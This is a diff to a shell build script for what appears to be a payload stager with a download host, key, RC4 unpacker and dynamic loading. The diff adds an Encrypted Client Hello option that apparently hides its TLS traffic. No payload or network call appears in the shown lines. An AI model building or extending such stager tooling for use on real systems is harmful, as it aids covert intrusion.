@@ -11,6 +11,8 @@ DOWNLOAD_KEY=""
 UNPACKER="rc4"
 DYNLOAD_MODE="public"
 HASH_STYLE="auto"
+ECH="off"
+ECH_CONFIG=""
 
 DEBUG_FLAG=""
 
@@ -57,6 +59,14 @@ while [[ $# -gt 0 ]]; do
     HASH_STYLE="$2"
     shift 2
     ;;
+  --ech)
+    ECH="$2"
+    shift 2
+    ;;
+  --ech-config | --ech_config)
+    ECH_CONFIG="$2"
+    shift 2
+    ;;
   *)
     # Handle --key=value style arguments if passed
     if [[ "$1" == --*=* ]]; then
@@ -73,6 +83,8 @@ while [[ $# -gt 0 ]]; do
       --unpacker) UNPACKER="$val" ;;
       --dynload-mode | --dynload_mode) DYNLOAD_MODE="$val" ;;
       --hash-style | --hash_style) HASH_STYLE="$val" ;;
+      --ech) ECH="$val" ;;
+      --ech-config | --ech_config) ECH_CONFIG="$val" ;;
       esac
       shift 1
     else
@@ -92,6 +104,9 @@ echo "    Download Host: $DOWNLOAD_HOST"
 echo "    Download Port: $DOWNLOAD_PORT"
 echo "    Download Path: $DOWNLOAD_PATH"
 echo "    Download Key:  [SET]"
+# ECH only affects the libssl transport; ignored by the raw-socket transports.
+case "$ECH" in 1|on|true|yes) ECH_ENABLE=1 ;; *) ECH_ENABLE=0 ;; esac
+echo "    ECH:           $ECH (libssl transport only)"
 
 # Clean previous build artifacts
 make clean
@@ -125,6 +140,8 @@ make "$MAKE_TARGET" $DEBUG_FLAG \
   TRANSPORT="$TRANSPORT" \
   UNPACKER="$UNPACKER" \
   DYNLOAD_MODE="$DYNLOAD_MODE" \
-  HASH_STYLE="$HASH_STYLE"
+  HASH_STYLE="$HASH_STYLE" \
+  ECH="$ECH_ENABLE" \
+  ECH_CONFIG="$ECH_CONFIG"
 
 echo "[+] Stager build complete."
